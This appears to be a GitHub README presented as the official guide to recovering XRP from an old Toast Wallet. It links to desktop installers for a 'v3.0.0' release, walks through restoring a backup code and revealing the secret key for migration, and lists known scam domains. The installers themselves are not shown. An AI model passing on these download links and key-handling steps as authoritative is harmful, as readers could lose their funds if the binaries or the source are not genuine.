<div align="center">

# How to Recover XRP From an Old Toast Wallet

**Complete 2026 guide — recover your XRP using only official Toast Wallet tools.**

![Docs](https://img.shields.io/badge/DOCS-toast--wallet--docs-555555?style=for-the-badge) [![GitHub Org](https://img.shields.io/badge/GITHUB-Toast--Wallet-6f42c1?style=for-the-badge)](https://github.com/Toast-Wallet) ![License](https://img.shields.io/badge/LICENSE-GPL--2.0-97ca00?style=for-the-badge) ![Release](https://img.shields.io/badge/RELEASE-v3.0.0-0078D6?style=for-the-badge)

</div>

---

## 📥 Downloads — v3.0.0

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-WINDOWS-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) [![Download for macOS](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-MACOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) [![Download for Linux](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-LINUX-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage)

</div>

| Platform | Requirements | File | Checksum |
|---|---|---|---|
| 🪟 Windows | Windows desktop (64-bit) | [ToastWallet.Setup.3.0.0.exe](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-windows.sha256) |
| 🍎 macOS | macOS desktop | [ToastWallet-3.0.0.dmg](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-macos.sha256) |
| 🐧 Linux | Most modern 64-bit distributions, no install needed | [ToastWallet-3.0.0-x86_64.AppImage](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-linux.sha256) |

Verify your download against the matching SHA256 file before running any installer — all files
and checksums are also listed together on the
[**official v3.0.0 release page**](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> ⚠️ **Only download from this GitHub release page or the [official Toast-Wallet GitHub org](https://github.com/Toast-Wallet).**
> toastwallet.com is currently unreachable, and `toastwallet.app` is a known phishing clone —
> see our [full scam warning list](./toast-wallet-scam-warning-list.md).

---

## The Recovery Process

If you have an old Toast Wallet and want your XRP back, here is the process that actually works.
It typically takes 10–20 minutes if you have your credentials handy, longer if you need to track
them down first.

**Step 1: Gather what you have.** You need at least two of the following four things. Read our
[full breakdown of what each one is](./passphrase-vs-recovery-phrase-vs-backup-code-vs-secret-key.md)
if you're not sure which is which:
- Your **backup code** (a long encrypted block of text/JSON — this is the actual wallet data)
- Your **PIN** (6 digits, unlocks the app locally only)
- Your **passphrase** (a password you chose, needed to sign transactions)
- Your **6-word recovery phrase** (Toast-generated, used only to reset the passphrase)

The most common working combination is **backup code + PIN + either the passphrase or the
recovery phrase**. The backup code alone, without anything else, is generally not enough — it
gets you a restored wallet you can view but not move funds from.

**Step 2: Install the app using the downloads above.** Only use the official installer links —
never `toastwallet.app`, which is a phishing clone that steals anything imported into it.

**Step 3: Restore from your backup code.** Paste your backup code into the "Restore" flow exactly
as you saved it. The single most common failure here is formatting corruption — if you ever
copy-pasted the code through Word, Notes, or a rich-text editor, smart quotes or line breaks can
silently invalidate it. Paste into a plain text editor first to strip formatting, then copy again
from there. See our [guide to what a valid backup code looks like](./toast-wallet-backup-code-example.md)
if you're unsure whether what you have is even the right file.

**Step 4: Unlock with your PIN.** This gets you into the app and lets you see your balance, but
not move funds yet. If your balance looks smaller than you remember, that's very likely the XRP
Ledger's reserve requirement, not lost funds — see our
[explainer on why Toast Wallet shows "not activated"](./toast-wallet-not-activated-20-xrp-reserve.md).

**Step 5: Reset your passphrase using your recovery phrase, if needed.** If you don't remember
your original passphrase, go to "Reset Passphrase" and enter your 6-word recovery phrase in the
*current passphrase* field. If you get an error here, see our dedicated page on
[fixing "Old Passphrase Is Incorrect"](./old-passphrase-is-incorrect-error.md) — this is the
single most common blocker people hit, and it's almost always fixable.

**Step 6: Reveal your secret key and move your funds.** Once you're in, go to your wallet settings
and reveal the secret key (starts with "s", about 29 characters). Use this to import into an
actively maintained wallet — we recommend Xaman (formerly XUMM). See our
[migration guide](./migrate-toast-wallet-to-xaman.md) for exact steps. Once your funds are safely
moved, you're done — there's no need to keep using Toast Wallet day to day afterward.

**If none of the above works:** if you're missing both the backup code and the recovery phrase,
recovery is very unlikely — the encryption is intentionally strong (this protects you from
attackers as much as it blocks you). Before giving up, check old emails, notes apps, and physical
notebooks; many recovered users found their backup code in an email they'd sent to themselves
years earlier, or a screenshot of their recovery phrase from when the wallet was first created.
Do **not** pay for or trust a third-party "brute force" service, and never send your backup code
to anyone offering to recover it "for a cut" — see our page on
[whether brute-force tools are worth the risk](./toast-wallet-brute-force-tool.md) and our
[scam warning list](./toast-wallet-scam-warning-list.md) for the follow-up-scam pattern that
specifically targets people in this situation.

---

## ⚠️ Known Scams — Do Not Use These

- **The fake "Toast Plus" wallet app** — not affiliated with Toast Wallet, tied to over **$5M in stolen XRP** and a class-action lawsuit against Apple. See: [The Toast Plus App Scam](./toast-plus-app-scam.md).
- **The toastwallet.app phishing clone** — mimics the real recovery page to steal imported wallets. See: [Toast Wallet Phishing Sites](./toast-wallet-phishing-sites.md).
- **SEO clone sites impersonating Toast Wallet** — `xrp-toastwallet.com`, `toast-wallet.com`, `en-toastwallet.com`, `toast-wallet.net`.
- **Follow-up "recovery for a fee" scams** targeting people who already lost funds — never legitimate.

Complete list: [Toast Wallet Scam Alert: Full Warning List](./toast-wallet-scam-warning-list.md). To report a scam, visit [ic3.gov](https://www.ic3.gov).

## Related Articles

- [How to Access an Old Toast Wallet](./access-old-toast-wallet.md)
- [What a Toast Wallet Backup Code Looks Like](./toast-wallet-backup-code-example.md)
- [How to Set Up and Use Toast Wallet](./how-to-set-up-use-toast-wallet.md)
- [Toast Wallet vs Gatehub](./toast-wallet-vs-gatehub.md)
- [Account Support and Closing a Wallet](./toast-wallet-account-support-delete.md)
- [Toast Wallet FAQ & Glossary](./faq-glossary.md)
- [Passphrase vs Recovery Phrase vs Backup Code vs Secret Key](./passphrase-vs-recovery-phrase-vs-backup-code-vs-secret-key.md)
- [Fixing 'Old Passphrase Is Incorrect'](./old-passphrase-is-incorrect-error.md)
- [How to Migrate to Xaman Safely](./migrate-toast-wallet-to-xaman.md)
